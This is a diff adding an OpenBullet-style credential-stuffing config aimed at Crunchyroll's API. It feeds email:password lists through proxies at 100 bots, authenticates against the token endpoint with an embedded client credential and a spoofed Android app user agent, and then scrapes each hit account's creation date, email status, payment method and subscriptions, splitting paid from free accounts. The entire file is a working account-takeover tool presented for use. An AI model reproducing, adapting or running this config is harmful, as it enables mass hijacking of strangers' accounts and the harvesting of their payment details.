@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "Crunchyroll_API_NEW_UPDATED",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-13T22:53:23.8949433+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Ihab_Bessayah",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-?h?h?h?h-?h?h?h?h-?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "ID" 
+
+FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+REQUEST POST "https://beta-api.crunchyroll.com/auth/v1/token" 
+  CONTENT "username=<US>&password=<PS>&grant_type=password&scope=offline_access" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "ETP-Anonymous-ID: <ID>" 
+  HEADER "Authorization: Basic dXlsdGg0aV83ZTZwMGhyYmZsOGc6dGRNQnBJbUhWb3pCVTlmNEYxbDdpRllXNHRsNmZlazQ=" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 107" 
+  HEADER "Host: beta-api.crunchyroll.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: Crunchyroll/3.3.1 Android/5.1.1 okhttp/4.8.1" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "T" 
+
+REQUEST GET "https://beta-api.crunchyroll.com/accounts/v1/me" 
+  
+  HEADER "Authorization: Bearer <T>" 
+  HEADER "Host: beta-api.crunchyroll.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: Crunchyroll/3.3.1 Android/5.1.1 okhttp/4.8.1" 
+
+PARSE "<SOURCE>" LR "\"created\":\"" "\"" -> VAR "CREATED A" 
+
+PARSE "<CREATED A>" LR "" "T" CreateEmpty=FALSE -> CAP "CREATED AT" 
+
+PARSE "<SOURCE>" JSON "email_verified" CreateEmpty=FALSE -> CAP "EMAIL VERIFIED" 
+
+PARSE "<SOURCE>" JSON "external_id" -> VAR "ED" 
+
+REQUEST GET "https://beta-api.crunchyroll.com/subs/v1/subscriptions/<ED>/benefits" 
+  
+  HEADER "Authorization: Bearer <T>" 
+  HEADER "Host: beta-api.crunchyroll.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: Crunchyroll/3.3.1 Android/5.1.1 okhttp/4.8.1" 
+
+PARSE "<SOURCE>" JSON "source" CreateEmpty=FALSE -> CAP "PAYMENT METHOD" 
+
+PARSE "<SOURCE>" JSON "benefit" Recursive=TRUE CreateEmpty=FALSE -> CAP "SUBSCRIPTIONS" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "\"total\":0" 
+    KEY "<SUBSCRIPTIONS>" Exists 
+    KEY "<SOURCE>" DoesNotContain "subscription.not_found" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"total\":0" 
+    KEY "<SUBSCRIPTIONS>" DoesNotExist 
+    KEY "subscription.not_found" 
+
+FUNCTION Constant "9LIMBO" -> CAP "CONFIG BY" 
+
